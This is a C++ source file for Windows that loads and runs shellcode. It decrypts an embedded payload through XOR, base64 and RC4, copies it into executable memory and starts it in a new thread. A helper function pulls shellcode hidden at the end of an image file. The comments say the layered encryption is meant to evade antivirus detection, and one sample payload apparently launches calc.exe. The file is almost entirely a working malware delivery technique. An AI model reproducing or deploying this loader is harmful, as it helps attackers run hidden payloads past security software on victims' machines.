#define _CRT_SECURE_NO_WARNINGS



#include "import.h"
#include <wininet.h>
#pragma comment(lib, "wininet.lib")
#include <vector>
#include "base64.h"
#include "RC4.h"
using namespace std;

//------------------------------------------------------------
//xor+rc4
/*
unsigned char hexData[193] = {
	0xD5, 0x41, 0x5F, 0xAD, 0x55, 0xCE, 0xB9, 0x12, 0x3B, 0x1C, 0x36, 0xA2, 0x6F, 0xE3, 0xE8, 0x7E,
	0x97, 0xCA, 0x8C, 0x74, 0xF9, 0x91, 0x6E, 0x06, 0x29, 0x13, 0xFB, 0x21, 0x0B, 0x5B, 0x6F, 0x53,
	0xD3, 0x99, 0xF8, 0x4F, 0x44, 0xA9, 0x09, 0x65, 0x5E, 0xB2, 0x26, 0xE1, 0x49, 0x71, 0xE2, 0xF4,
	0x0E, 0x52, 0x3E, 0x70, 0xCC, 0x38, 0x11, 0x37, 0x98, 0x5E, 0x1D, 0x79, 0xE5, 0x2E, 0xBE, 0x63,
	0xDC, 0xAE, 0x16, 0x7D, 0xCE, 0xB3, 0xEE, 0xCE, 0x70, 0x4D, 0x4F, 0x78, 0xDD, 0x6C, 0x17, 0x83,
	0x53, 0x22, 0x23, 0x6B, 0x88, 0x6C, 0x3D, 0x68, 0xF5, 0x09, 0x07, 0xEB, 0xE7, 0x95, 0x1D, 0x18,
	0xAB, 0x1C, 0x07, 0x03, 0x30, 0xE9, 0xC9, 0x3B, 0xCA, 0x8D, 0x83, 0x48, 0x61, 0x77, 0x10, 0xA0,
	0x3B, 0xB7, 0xBE, 0xE5, 0x61, 0x85, 0x43, 0xD7, 0x39, 0xA8, 0x3A, 0x58, 0xE9, 0x6F, 0xC2, 0xF4,
	0xAD, 0x72, 0xC5, 0x52, 0x57, 0xCA, 0x45, 0xCE, 0x18, 0x7F, 0x04, 0x9A, 0xA5, 0xE0, 0x55, 0x41,
	0x1A, 0x46, 0x5B, 0xED, 0xCC, 0x59, 0x9E, 0x94, 0x4A, 0x5D, 0xC5, 0xCC, 0x65, 0xBA, 0xB6, 0x96,
	0xAA, 0x74, 0x71, 0x74, 0xDE, 0x3B, 0x9B, 0xFE, 0x3B, 0xCA, 0x21, 0xC5, 0x50, 0xC5, 0x21, 0xFE,
	0xE7, 0x1C, 0xA8, 0x70, 0x72, 0x26, 0x91, 0x5A, 0x3C, 0xDC, 0x8C, 0x02, 0x24, 0x8E, 0xCB, 0x3C,
	0x20



*/






//------------------------------------------------------------
//xor+rc4+base64 cmd=calc.exe


//unsigned char hexData[260] = {
//	0x1F, 0x2A, 0x0E, 0x5B, 0x11, 0x2D, 0x10, 0x07, 0x59, 0x21, 0x1D, 0x3A, 0x0D, 0x3F, 0x46, 0x25,
//	0x2B, 0x06, 0x18, 0x2B, 0x2F, 0x46, 0x5F, 0x03, 0x5C, 0x3B, 0x5B, 0x38, 0x42, 0x28, 0x0D, 0x1F,
//	0x38, 0x21, 0x18, 0x3A, 0x3A, 0x2E, 0x20, 0x10, 0x2B, 0x03, 0x18, 0x5F, 0x51, 0x23, 0x2C, 0x04,
//	0x25, 0x0A, 0x2B, 0x0E, 0x2D, 0x2D, 0x0F, 0x0B, 0x3D, 0x5D, 0x0E, 0x0E, 0x2E, 0x20, 0x1C, 0x0D,
//	0x33, 0x13, 0x1D, 0x31, 0x2E, 0x08, 0x3F, 0x3B, 0x0C, 0x2F, 0x5E, 0x11, 0x27, 0x5A, 0x38, 0x38,
//	0x03, 0x2C, 0x0F, 0x31, 0x2A, 0x1B, 0x31, 0x21, 0x0F, 0x11, 0x3A, 0x07, 0x5B, 0x06, 0x0C, 0x07,
//	0x2E, 0x3A, 0x38, 0x04, 0x2C, 0x0B, 0x38, 0x2F, 0x0F, 0x1C, 0x06, 0x5F, 0x3A, 0x59, 0x06, 0x2A,
//	0x5D, 0x38, 0x3F, 0x3C, 0x28, 0x33, 0x11, 0x0E, 0x0B, 0x06, 0x22, 0x26, 0x46, 0x21, 0x3B, 0x11,
//	0x1E, 0x07, 0x3F, 0x1C, 0x08, 0x05, 0x04, 0x28, 0x06, 0x2F, 0x22, 0x03, 0x5C, 0x26, 0x06, 0x01,
//	0x2A, 0x2B, 0x5C, 0x5C, 0x10, 0x3F, 0x25, 0x0C, 0x58, 0x5D, 0x1E, 0x20, 0x5E, 0x2A, 0x18, 0x42,
//	0x3C, 0x24, 0x2F, 0x3D, 0x24, 0x30, 0x28, 0x2E, 0x18, 0x5C, 0x5A, 0x2C, 0x2E, 0x5F, 0x1E, 0x5E,
//	0x39, 0x18, 0x24, 0x1A, 0x19, 0x5A, 0x2C, 0x3E, 0x0B, 0x0F, 0x39, 0x24, 0x00, 0x3D, 0x1E, 0x06,
//	0x0A, 0x10, 0x51, 0x10, 0x01, 0x22, 0x3C, 0x1E, 0x50, 0x46, 0x59, 0x03, 0x27, 0x22, 0x10, 0x05,
//	0x2D, 0x27, 0x39, 0x0F, 0x46, 0x51, 0x24, 0x0D, 0x2E, 0x2B, 0x5B, 0x5A, 0x3C, 0x1F, 0x22, 0x31,
//	0x3C, 0x18, 0x27, 0x20, 0x1B, 0x2D, 0x04, 0x1A, 0x3A, 0x23, 0x0C, 0x26, 0x0D, 0x0A, 0x2C, 0x33,
//	0x2E, 0x59, 0x46, 0x5D, 0x24, 0x58, 0x3E, 0x58, 0x5C, 0x3E, 0x1D, 0x27, 0x5C, 0x5F, 0x23, 0x3F,
//	0x3A, 0x38, 0x54, 0x54
//};


//------------------------------------------------------------
//-----------       Created with 010 Editor        -----------
//------         www.sweetscape.com/010editor/          ------
//
// File    : I:\code\ShellCode\ShellCodeEncode\Release\shellcode_rc4_xor_base64.txt
// Address : 0 (0x0)
// Size    : 472 (0x1D8)
//------------------------------------------------------------
//unsigned char hexData[472] = {
//	0x1F, 0x2A, 0x0E, 0x5E, 0x11, 0x2D, 0x10, 0x07, 0x59, 0x21, 0x1D, 0x3A, 0x0D, 0x3C, 0x5A, 0x25,
//	0x2B, 0x06, 0x00, 0x2B, 0x2F, 0x46, 0x5F, 0x03, 0x5C, 0x3B, 0x5B, 0x38, 0x38, 0x06, 0x19, 0x20,
//	0x42, 0x20, 0x0F, 0x42, 0x5C, 0x3A, 0x21, 0x05, 0x04, 0x51, 0x33, 0x5A, 0x1A, 0x39, 0x23, 0x5B,
//	0x2D, 0x10, 0x5B, 0x39, 0x1E, 0x39, 0x02, 0x3B, 0x1B, 0x25, 0x59, 0x5E, 0x26, 0x1C, 0x42, 0x0D,
//	0x46, 0x26, 0x20, 0x27, 0x0A, 0x18, 0x3F, 0x0F, 0x3F, 0x3A, 0x0F, 0x2A, 0x50, 0x2D, 0x3E, 0x5C,
//	0x3E, 0x28, 0x13, 0x5F, 0x33, 0x1B, 0x31, 0x2C, 0x19, 0x27, 0x0B, 0x07, 0x2E, 0x0B, 0x1E, 0x50,
//	0x2E, 0x3F, 0x00, 0x58, 0x05, 0x08, 0x1D, 0x28, 0x1F, 0x38, 0x50, 0x1E, 0x1A, 0x24, 0x1E, 0x2A,
//	0x51, 0x28, 0x11, 0x25, 0x3B, 0x08, 0x1B, 0x39, 0x59, 0x1B, 0x3E, 0x5D, 0x0E, 0x23, 0x0A, 0x51,
//	0x11, 0x05, 0x0E, 0x3B, 0x24, 0x38, 0x2B, 0x5C, 0x3A, 0x2C, 0x02, 0x24, 0x07, 0x3C, 0x21, 0x10,
//	0x5B, 0x58, 0x19, 0x0A, 0x2E, 0x1E, 0x18, 0x51, 0x58, 0x5D, 0x2E, 0x3D, 0x5E, 0x03, 0x08, 0x2E,
//	0x0D, 0x3C, 0x04, 0x2D, 0x3F, 0x2F, 0x23, 0x0D, 0x22, 0x1C, 0x1D, 0x0E, 0x30, 0x27, 0x0A, 0x5F,
//	0x5E, 0x1D, 0x2A, 0x0C, 0x0A, 0x21, 0x5B, 0x2D, 0x03, 0x2A, 0x30, 0x3E, 0x30, 0x0B, 0x0A, 0x5F,
//	0x04, 0x1F, 0x42, 0x05, 0x3A, 0x1D, 0x2C, 0x2A, 0x2E, 0x2D, 0x21, 0x2C, 0x03, 0x58, 0x11, 0x5D,
//	0x5B, 0x0F, 0x08, 0x2F, 0x2B, 0x0E, 0x25, 0x20, 0x10, 0x33, 0x3F, 0x2C, 0x08, 0x31, 0x59, 0x2D,
//	0x19, 0x46, 0x24, 0x25, 0x5A, 0x2C, 0x5B, 0x19, 0x51, 0x46, 0x05, 0x33, 0x3C, 0x46, 0x5D, 0x0B,
//	0x24, 0x19, 0x11, 0x1A, 0x5C, 0x1A, 0x02, 0x2B, 0x5D, 0x1E, 0x20, 0x25, 0x38, 0x07, 0x23, 0x1B,
//	0x10, 0x19, 0x5C, 0x07, 0x0F, 0x02, 0x5D, 0x33, 0x00, 0x2B, 0x58, 0x23, 0x1A, 0x1C, 0x5A, 0x2B,
//	0x23, 0x0B, 0x1B, 0x0C, 0x01, 0x08, 0x3F, 0x51, 0x1D, 0x28, 0x5D, 0x2F, 0x31, 0x02, 0x18, 0x46,
//	0x51, 0x06, 0x39, 0x0A, 0x18, 0x42, 0x3A, 0x5E, 0x18, 0x3A, 0x2C, 0x25, 0x23, 0x26, 0x26, 0x46,
//	0x19, 0x59, 0x30, 0x1E, 0x38, 0x5E, 0x1F, 0x19, 0x2D, 0x25, 0x2B, 0x1F, 0x0C, 0x1A, 0x3F, 0x1C,
//	0x21, 0x5B, 0x03, 0x24, 0x5E, 0x3B, 0x23, 0x1E, 0x05, 0x02, 0x0A, 0x05, 0x39, 0x59, 0x31, 0x25,
//	0x46, 0x03, 0x2E, 0x31, 0x02, 0x38, 0x20, 0x0E, 0x0D, 0x3C, 0x07, 0x1A, 0x11, 0x5A, 0x38, 0x5C,
//	0x3B, 0x50, 0x3F, 0x1D, 0x30, 0x25, 0x2E, 0x2C, 0x0D, 0x21, 0x0C, 0x1F, 0x06, 0x5F, 0x39, 0x19,
//	0x3A, 0x5B, 0x39, 0x23, 0x5C, 0x3F, 0x0C, 0x3D, 0x06, 0x28, 0x0D, 0x22, 0x1B, 0x20, 0x13, 0x30,
//	0x3A, 0x31, 0x3B, 0x0E, 0x26, 0x3C, 0x5F, 0x21, 0x24, 0x28, 0x28, 0x5E, 0x19, 0x1E, 0x1E, 0x18,
//	0x21, 0x3D, 0x05, 0x10, 0x5A, 0x3E, 0x04, 0x3A, 0x07, 0x25, 0x10, 0x3C, 0x19, 0x0E, 0x28, 0x3C,
//	0x5A, 0x03, 0x1E, 0x1B, 0x08, 0x3E, 0x3E, 0x0D, 0x1E, 0x0A, 0x3F, 0x19, 0x19, 0x5C, 0x20, 0x5D,
//	0x13, 0x3C, 0x27, 0x46, 0x33, 0x0E, 0x27, 0x20, 0x05, 0x42, 0x2B, 0x1F, 0x39, 0x26, 0x05, 0x10,
//	0x25, 0x42, 0x5B, 0x23, 0x3F, 0x26, 0x59, 0x2D, 0x2E, 0x08, 0x08, 0x50, 0x08, 0x10, 0x5E, 0x0E,
//	0x50, 0x01, 0x3F, 0x0E, 0x5D, 0x26, 0x58, 0x13
//};

//------------------------------------------------------------
//-----------       Created with 010 Editor        -----------
//------         www.sweetscape.com/010editor/          ------
//
// File    : I:\code\ShellCode\ShellCodeEncode\Release\shellcode_rc4_xor_base64.txt
// Address : 0 (0x0)
// Size    : 260 (0x104)
//------------------------------------------------------------
unsigned char hexData[260] = {
	0x1F, 0x2A, 0x0E, 0x5B, 0x11, 0x2D, 0x10, 0x07, 0x59, 0x21, 0x1D, 0x3A, 0x0D, 0x3F, 0x46, 0x25,
	0x2B, 0x06, 0x18, 0x2B, 0x2F, 0x46, 0x5F, 0x03, 0x5C, 0x3B, 0x5B, 0x38, 0x42, 0x28, 0x0D, 0x1F,
	0x38, 0x21, 0x18, 0x3A, 0x3A, 0x2E, 0x20, 0x10, 0x2B, 0x03, 0x18, 0x5F, 0x51, 0x23, 0x2C, 0x04,
	0x25, 0x0A, 0x2B, 0x0E, 0x2D, 0x2D, 0x0F, 0x0B, 0x3D, 0x5D, 0x0E, 0x0E, 0x2E, 0x20, 0x1C, 0x0D,
	0x33, 0x13, 0x1D, 0x31, 0x2E, 0x08, 0x3F, 0x3B, 0x0C, 0x2F, 0x5E, 0x11, 0x27, 0x5A, 0x38, 0x38,
	0x03, 0x2C, 0x0F, 0x31, 0x2A, 0x1B, 0x31, 0x21, 0x0F, 0x11, 0x3A, 0x07, 0x5B, 0x06, 0x0C, 0x07,
	0x2E, 0x3A, 0x38, 0x04, 0x2C, 0x0B, 0x38, 0x2F, 0x0F, 0x1C, 0x06, 0x5F, 0x3A, 0x59, 0x06, 0x2A,
	0x5D, 0x38, 0x3F, 0x3C, 0x28, 0x33, 0x11, 0x0E, 0x0B, 0x06, 0x22, 0x26, 0x46, 0x21, 0x3B, 0x11,
	0x1E, 0x07, 0x3F, 0x1C, 0x08, 0x05, 0x04, 0x28, 0x06, 0x2F, 0x22, 0x03, 0x5C, 0x26, 0x06, 0x01,
	0x2A, 0x2B, 0x5C, 0x5C, 0x10, 0x3F, 0x25, 0x0C, 0x58, 0x5D, 0x1E, 0x20, 0x5E, 0x2A, 0x18, 0x42,
	0x3C, 0x24, 0x2F, 0x3D, 0x24, 0x30, 0x28, 0x2E, 0x18, 0x5C, 0x5A, 0x2C, 0x2E, 0x5F, 0x1E, 0x5E,
	0x39, 0x18, 0x24, 0x1A, 0x19, 0x5A, 0x2C, 0x3E, 0x0B, 0x0F, 0x39, 0x24, 0x00, 0x3D, 0x1E, 0x06,
	0x0A, 0x10, 0x51, 0x10, 0x01, 0x22, 0x3C, 0x1E, 0x50, 0x46, 0x59, 0x03, 0x27, 0x22, 0x10, 0x05,
	0x2D, 0x27, 0x39, 0x0F, 0x46, 0x51, 0x24, 0x0D, 0x2E, 0x2B, 0x5B, 0x5A, 0x3C, 0x1F, 0x22, 0x31,
	0x3C, 0x18, 0x27, 0x20, 0x1B, 0x2D, 0x04, 0x1A, 0x3A, 0x23, 0x0C, 0x26, 0x0D, 0x0A, 0x2C, 0x33,
	0x2E, 0x59, 0x46, 0x5D, 0x24, 0x58, 0x3E, 0x58, 0x5C, 0x3E, 0x1D, 0x27, 0x5C, 0x5F, 0x23, 0x3F,
	0x3A, 0x38, 0x54, 0x54
};

char* GetShellCode_SzBuffer(const char* FILEPATH,int ShellcodeSize)
{
	//打开图片
	HANDLE Handle_File = CreateFile((const char*)FILEPATH, GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	//得到图片大小
	DWORD ImageSize = GetFileSize(Handle_File,NULL);
	//申请图片大小的缓冲区
	char* szBuffer = new char[ImageSize] {0};
	//读取图片到缓冲区
	DWORD lpNumberOfBytesRead = 0;
	bool file_status = ReadFile(Handle_File, szBuffer, ImageSize, &lpNumberOfBytesRead,NULL);
	if (!file_status)
	{
		cout << "file read failed!!"<<endl;
	}
	//申请shellcode缓冲区
	char* ShellcodeBuffer = new char[ShellcodeSize] {0};
	DWORD ShellcodeBase = ImageSize - ShellcodeSize;
	memcpy(ShellcodeBuffer, (szBuffer + ShellcodeBase), ShellcodeSize);

	return ShellcodeBuffer;



}




void xordecode(char* buffer, int hexlength, char Key)
{

	for (size_t i = 0; i < hexlength; i++)
	{
		buffer[i] ^= Key;

	}
}


int main(int argc, char** argv)
{




	//第一道XOR解密
	xordecode((char*)&hexData, sizeof(hexData), 0x69);  //xor+base64+rc4加密免杀

	//第二道base64解密

	string base64_encode_crypte = (char *)hexData;  //xor+base64+rc4加密免杀
	string base64_decode_code = base64_decode(base64_encode_crypte);


	//第三道RC4解密
	RC4 rc4encode;
	const char* key = "password";
	rc4encode.rc4_init((unsigned char*)key, sizeof(key));
	rc4encode.do_crypt((unsigned char*)base64_decode_code.c_str(), base64_decode_code.length());
	LPVOID  buffer = VirtualAlloc(NULL, 0x200, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
//	LPVOID  buffer = (char*)LI_FN(VirtualAlloc)(nullptr, base64_decode_code.length(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	SIZE_T lpNumberOfBytesWritten = 0;
	//bool status = WriteProcessMemory(GetCurrentProcess(), buffer, base64_decode_code.c_str(), base64_decode_code.length(), &lpNumberOfBytesWritten);
	bool status = WriteProcessMemory(GetCurrentProcess(), buffer, base64_decode_code.c_str(), base64_decode_code.length(), &lpNumberOfBytesWritten);
	if (!status)
	{
		cout << "Write process memory failed!" << endl;
	}

	//HANDLE htread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)buffer, NULL, NULL, NULL);
	HANDLE htread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)buffer, NULL, NULL, NULL);
	WaitForSingleObject(htread, INFINITE);
	
	
	return EXIT_SUCCESS;
}
